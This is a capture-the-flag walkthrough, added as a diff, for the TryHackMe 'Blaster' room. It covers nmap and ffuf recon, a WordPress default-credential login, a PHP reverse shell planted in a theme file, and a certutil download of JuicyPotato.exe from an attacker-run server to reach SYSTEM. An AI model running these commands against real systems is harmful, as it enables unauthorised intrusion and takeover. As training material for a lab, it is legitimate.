@@ -1,0 +1,91 @@
+----------------                               ------------------
+               :::::::::::;| BLASTER |;::::::::::::
+
+
+1) FIRST WE HAVE TO ACCES THE TRYHACKME FROM OPENVPN.
+2) WE HAVE TO JOIN THE ROOM "BLASTER".
+ 
+TASK - 1 (RECON)
+
+1. SCAN THE MACHNE.
+
+    namp -Pn <ip>
+
+    nmap -A -T 5 <ip> -vv
+
+"it's a Windows machine running IIS".
+
+2. How many ports are open?
+ANS: 2 ports (80/HTTP, 3389/RDP).
+
+3. What's on the website?
+ANS: Default IIS page - time to FUZZ!
+
+----------TASK 1 COMPLETED----------
+
+TASK - 2 (WEB ENUM)
+
+1. FIND HIDDEN DIRS.
+
+    ffuf -u http://<ip>/FUZZ -w /usr/share/wordlists/dirb/common.txt
+
+"FOUND /retro/ - looks like WordPress!"
+
+2. CHECK WORDPRESS.
+
+    http://<ip>/retro/wp-login.php
+
+"Let's try admin:admin... LOL IT WORKS!"
+
+----------TASK 2 COMPLETED-----------
+
+TASK - 3 (GAIN ACCESS)
+
+1. UPLOAD SHELL.
+
+    Go to Appearance -> Theme Editor
+    Edit 404.php and paste PHP reverse shell
+    Save and access: http://<ip>/retro/wp-content/themes/90s-retro/404.php
+
+"GOT SHELL! Check whoami: iis apppool\defaultapppool"
+
+----------TASK 3 COMPLETED-----------
+
+TASK - 4 (PRIV ESC)
+
+1. CHECK PRIVS.
+
+    whoami /priv
+
+"SeImpersonatePrivilege = ENABLED! JuicyPotato time!"
+
+2. TRANSFER EXPLOIT.
+
+    On Kali: python3 -m http.server 80
+    On Victim: 
+    certutil -urlcache -f http://<your_ip>/JuicyPotato.exe jp.exe
+
+3. RUN EXPLOIT.
+
+    jp.exe -t * -p C:\Windows\System32\cmd.exe -l 1337
+
+"BOOM! Connect with nc <ip> 1337"
+"whoami = nt authority\system !!!"
+
+----------TASK 4 COMPLETED-----------
+
+TASK-5 (FIND FLAGS)
+
+1. USER FLAG.
+
+    type C:\Users\Wade\Desktop\user.txt
+
+2. ROOT FLAG.
+
+    type C:\Users\Administrator\Desktop\root.txt
+
+"BOTH FLAGS CAPTURED!"
+
+-------------------                                                --------------------
+             -----------                                    ------------
+                  ---------- BLASTER OWNED ----------
